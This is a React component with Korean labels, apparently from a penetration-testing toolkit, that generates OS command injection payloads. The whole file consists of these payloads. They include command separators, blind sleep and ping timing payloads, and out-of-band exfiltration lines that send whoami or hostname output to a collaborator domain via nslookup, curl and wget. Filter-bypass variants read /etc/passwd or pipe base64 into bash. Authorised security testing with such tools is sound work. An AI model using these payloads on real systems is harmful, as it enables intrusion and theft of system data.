import { useState } from 'react'
import { DISCLAIMER, Note, Readout, TextInput } from './shared'

export function OsCommandInjectionBuilder() {
  const [param, setParam] = useState('')
  const [collaborator, setCollaborator] = useState('')
  const oob = collaborator.trim() || 'xxxx.burpcollaborator.net'

  const separators = [
    { label: '세미콜론', code: '; id' },
    { label: 'AND (성공시만 실행)', code: '&& id' },
    { label: 'OR (실패시만 실행)', code: '|| id' },
    { label: '파이프', code: '| id' },
    { label: '백틱', code: '`id`' },
    { label: '커맨드 치환', code: '$(id)' },
    { label: '개행 인젝션 (URL 인코딩)', code: '%0a id' },
  ]
  const blind = [
    { label: 'Sleep 기반 (Linux)', code: '; sleep 10' },
    { label: 'Timeout 기반 (Windows)', code: '& timeout 10' },
    { label: 'Ping 기반 (응답시간 확인)', code: '; ping -c 10 127.0.0.1' },
  ]
  const oobPayloads = [
    { label: 'DNS Exfil (nslookup)', code: `; nslookup $(whoami).${oob}` },
    { label: 'DNS Exfil (curl)', code: `; curl http://$(whoami).${oob}` },
    { label: 'wget 콜백', code: `; wget http://${oob}/$(hostname)` },
  ]
  const bypass = [
    { label: '공백 우회 (IFS)', code: 'cat${IFS}/etc/passwd' },
    { label: '공백 우회 (중괄호 확장)', code: '{cat,/etc/passwd}' },
    { label: "블랙리스트 문자 우회 (따옴표 분할)", code: "c'a't /etc/passwd" },
    { label: '대소문자/와일드카드 우회', code: '/???/??t /etc/passwd' },
    { label: 'Base64 인코딩 후 디코딩 실행', code: 'echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash' },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="파라미터명 (참고용)" value={param} onChange={setParam} placeholder="cmd" />
      <TextInput label="OOB 콜라보레이터 도메인" value={collaborator} onChange={setCollaborator} placeholder="xxxx.burpcollaborator.net" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">기본 구분자</strong>
        {separators.map((payload, index) => (
          <Readout key={index} title={payload.label} value={payload.code} wrap="anywhere" />
        ))}
      </div>
      <div className="payload-readout-group">
        <strong className="payload-group-title">블라인드 (출력 없음, 시간차 확인)</strong>
        {blind.map((payload, index) => (
          <Readout key={index} title={payload.label} value={payload.code} wrap="anywhere" />
        ))}
      </div>
      <div className="payload-readout-group">
        <strong className="payload-group-title">OOB (Out-of-band) 데이터 유출</strong>
        {oobPayloads.map((payload, index) => (
          <Readout key={index} title={payload.label} value={payload.code} wrap="anywhere" />
        ))}
        <Note>Burp Collaborator 또는 자체 DNS 로깅 서버로 콜백을 수신해 블라인드 인젝션을 확정합니다.</Note>
      </div>
      <div className="payload-readout-group">
        <strong className="payload-group-title">필터/WAF 우회</strong>
        {bypass.map((payload, index) => (
          <Readout key={index} title={payload.label} value={payload.code} wrap="anywhere" />
        ))}
      </div>
    </div>
  )
}

export default OsCommandInjectionBuilder
